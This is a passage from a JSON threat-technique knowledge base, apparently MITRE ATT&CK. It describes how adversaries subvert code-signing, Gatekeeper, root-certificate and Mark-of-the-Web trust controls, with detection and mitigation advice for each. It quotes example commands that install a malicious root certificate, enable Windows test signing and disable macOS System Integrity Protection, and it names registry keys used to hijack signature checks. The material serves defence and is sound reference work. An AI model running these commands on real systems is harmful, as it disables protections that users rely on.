still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented."},{"id":"M1026","name":"Privileged Account Management","description":"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root."},{"id":"M1028","name":"Operating System Configuration","description":"Windows Group Policy can be used to manage root certificates and the <code>Flags</code> value of <code>HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\ProtectedRoots</code> can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store. <a href=\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Code Signing Dec 2017)</a>"},{"id":"M1038","name":"Execution Prevention","description":"System settings can prevent applications from running that haven't been downloaded through the Apple Store (or other legitimate repositories) which can help mitigate some of these issues. Also enable application control solutions such as AppLocker and/or Device Guard to block the loading of malicious content."},{"id":"M1054","name":"Software Configuration","description":"HTTP Public Key Pinning (HPKP) is one method to mitigate potential Adversary-in-the-Middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate. <a href=\"https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia HPKP)</a>"}],"subTechniques":[{"id":"T1553.001","name":"Gatekeeper Bypass","description":"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications. <a href=\"https://eclecticlight.co/2020/10/29/quarantine-and-the-quarantine-flag/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TheEclecticLightCompany Quarantine and the flag)</a> (Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called <code>com.apple.quarantine</code> (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution. <a href=\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OceanLotus for OS X)</a> <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a>\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the <code>api.apple-cloudkit.com</code> API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Stealth), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks. <a href=\"https://theevilbit.github.io/posts/gatekeeper_not_a_bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: theevilbit gatekeeper bypass 2021)</a> <a href=\"https://redcanary.com/blog/mac-application-bundles/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Application Bundle Manipulation Brandon Dalton)</a>\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.","detection":"The removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the <code>com.apple.quarantine</code> flag when performing updates. \n\nReview <code>false</code> values under the <code>LSFileQuarantineEnabled</code> entry in an application's <code>Info.plist</code> file (required by every application). <code>false</code> under <code>LSFileQuarantineEnabled</code> indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified <code>LSFileQuarantineEnabled</code> entry will default to not setting the quarantine flag. \n\nQuarantineEvents is a SQLite database containing a list of all files assigned the <code>com.apple.quarantine</code> attribute, located at <code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed. <a href=\"https://eclecticlight.co/2020/10/29/quarantine-and-the-quarantine-flag/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TheEclecticLightCompany Quarantine and the flag)</a>","platforms":["macOS"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Metadata","File: File Modification"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"System settings can prevent applications from running that haven't been downloaded through the Apple Store which can help mitigate some of these issues."}]},{"id":"T1553.002","name":"Code Signing","description":"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. <a href=\"https://en.wikipedia.org/wiki/Code_signing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Code Signing)</a> The certificates used during an operation may be created, acquired, or stolen by the adversary. <a href=\"https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Digital Certificates)</a> <a href=\"http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Digital Certificates)</a> Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. <a href=\"https://en.wikipedia.org/wiki/Code_signing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Code Signing)</a> <a href=\"https://eclecticlight.co/2020/11/16/checks-on-executable-code-in-catalina-and-big-sur-a-first-draft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EclecticLightChecksonEXECodeSigning)</a>\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.","detection":"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.","platforms":["macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[]},{"id":"T1553.003","name":"SIP and Trust Provider Hijacking","description":"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode <a href=\"https://msdn.microsoft.com/library/ms537359.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Authenticode)</a> digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WinVerifyTrust)</a> which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) <a href=\"https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EduardosBlog SIPs July 2008)</a> to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all <a href=\"https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Catalog Files and Signatures April 2017)</a>) and are identified by globally unique identifiers (GUIDs). <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>\n\nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP <a href=\"https://github.com/mattifestation/PoCSubjectInterfacePackage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub SIP POC Sept 2017)</a> (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP <a href=\"https://github.com/mattifestation/PoCSubjectInterfacePackage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub SIP POC Sept 2017)</a> (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* <strong>Note:</strong> The above hijacks are also possible without modifying the Registry via DLL search order hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>","detection":"Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>\n\nEnable CryptoAPI v2 (CAPI) event logging <a href=\"http://www.entrust.net/knowledge-base/technote.cfm?tn=8165\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Entrust Enable CAPI2 Aug 2017)</a> to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>\n\nUtilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) <a href=\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn311461(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Registry Auditing Aug 2016)</a> setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: <a href=\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941614(v=ws.10)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Audit Registry July 2012)</a>\n\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\n\n<strong>Note:</strong> As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using Regsvr32. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a>","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Module: Module Load","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict storage and execution of SIP DLLs to protected directories, such as C:\\\\Windows, rather than user directories."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Components may still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented."},{"id":"M1038","name":"Execution Prevention","description":"Enable application control solutions such as AppLocker and/or Device Guard to block the loading of malicious SIP DLLs."}]},{"id":"T1553.004","name":"Install Root Certificate","description":"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. <a href=\"https://en.wikipedia.org/wiki/Root_certificate\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Root Certificate)</a> Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. <a href=\"https://www.youtube.com/watch?v=gchKFumYHWc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Operation Emmental)</a>\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications. <a href=\"https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Superfish)</a>\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. <a href=\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Code Signing Dec 2017)</a>\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. <a href=\"https://objective-see.com/blog/blog_0x26.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objective-see ay mami 2018)</a>","detection":"A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. <a href=\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Code Signing Dec 2017)</a> Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. <a href=\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Code Signing Dec 2017)</a> The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. <a href=\"https://docs.microsoft.com/sysinternals/downloads/sigcheck\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sigcheck May 2017)</a>\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: <a href=\"https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tripwire AppUNBlocker)</a>\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Windows Registry: Windows Registry Key Modification","Windows Registry: Windows Registry Key Creation"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Windows Group Policy can be used to manage root certificates and the <code>Flags</code> value of <code>HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\ProtectedRoots</code> can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store. <a href=\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Code Signing Dec 2017)</a>"},{"id":"M1054","name":"Software Configuration","description":"HTTP Public Key Pinning (HPKP) is one method to mitigate potential Adversary-in-the-Middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate. <a href=\"https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia HPKP)</a>"}]},{"id":"T1553.005","name":"Mark-of-the-Web Bypass","description":"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/6e3f7352-d11c-4d76-8c39-2516a9df36e8\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Zone.Identifier 2020)</a> Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it. <a href=\"https://medium.com/swlh/investigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beek Use of VHD Dec 2020)</a> <a href=\"https://outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outflank MotW 2020)</a> <a href=\"https://www.intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer Russian APT Dec 2020)</a>\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections. <a href=\"https://medium.com/swlh/investigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beek Use of VHD Dec 2020)</a> <a href=\"https://outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outflank MotW 2020)</a>","detection":"Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. <a href=\"https://gist.github.com/wdormann/fca29e0dcda8b5c0472e73e10c78c3e7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Disable automount for ISO)</a>","platforms":["Windows"],"dataSources":["File: File Metadata","File: File Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Consider blocking container file types at web and/or email gateways. Consider unregistering container file extensions in Windows File Explorer. <a href=\"https://insights.sei.cmu.edu/cert/2019/09/the-dangers-of-vhd-and-vhdx-files.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dormann Dangers of VHD 2019)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling auto-mounting of disk image files (i.e., .iso, .img, .vhd, and .vhdx). This can be achieved by modifying the Registry values related to the Windows Explorer file associations in order to disable the automatic Explorer \"Mount and Burn\" dialog for these file extensions. Note: this will not deactivate the mount functionality itself. <a href=\"https://gist.github.com/wdormann/fca29e0dcda8b5c0472e73e10c78c3e7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub MOTW)</a>"}]},{"id":"T1553.006","name":"Code Signing Policy Modification","description":"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653559(v=vs.85)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DSE June 2017)</a> <a href=\"https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Disable SIP)</a> Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/installing-an-unsigned-driver-during-development-and-test\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Unsigned Driver Apr 2017)</a> <a href=\"https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Disable SIP)</a>\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TESTSIGNING Feb 2021)</a> <a href=\"https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Disable SIP)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye HIKIT Rootkit Part 2)</a> <a href=\"https://github.com/hfiref0x/TDL\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Turla Driver Loader)</a> Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TESTSIGNING Feb 2021)</a> <a href=\"https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Disable SIP)</a> Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts. <a href=\"https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163408/BlackEnergy_Quedagh.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: F-Secure BlackEnergy 2014)</a>\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver. <a href=\"https://unit42.paloaltonetworks.com/acidbox-rare-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 AcidBox June 2020)</a> <a href=\"https://github.com/hfiref0x/TDL\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Turla Driver Loader)</a>","detection":"Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TESTSIGNING Feb 2021)</a> Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\\Software\\Policies\\Microsoft\\Windows NT\\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare.","platforms":["macOS","Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for the Registry to prevent users from modifying keys related to code signing policies."},{"id":"M1026","name":"Privileged Account Management","description":"Limit the usage of local administrator and domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries."},{"id":"M1046","name":"Boot Integrity","description":"Use of Secure Boot may prevent some implementations of modification to code signing policies. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TESTSIGNING Feb 2021)</a>"}]}]},{"id":"T1556","name":"Modify Authentication Process","description":"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe. <a 